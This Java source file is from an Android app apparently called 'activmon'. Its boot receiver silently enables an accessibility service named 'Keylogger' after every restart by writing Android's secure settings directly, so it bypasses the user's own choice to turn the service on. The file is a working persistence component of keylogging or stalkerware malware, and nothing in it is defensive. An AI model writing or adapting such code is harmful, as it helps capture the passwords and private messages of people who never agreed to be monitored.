package com.example.activmon;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;

import java.util.Objects;

public class BootUpReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Objects.equals(intent.getAction(), Intent.ACTION_BOOT_COMPLETED)) {
            // Enable the accessibility service
            ContentResolver contentResolver = context.getContentResolver();
            Settings.Secure.putString(contentResolver,Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, "com.example.activmon/com.example.activmon.Keylogger");
            Settings.Secure.putString(contentResolver,Settings.Secure.ACCESSIBILITY_ENABLED, "1");
        }
    }
}
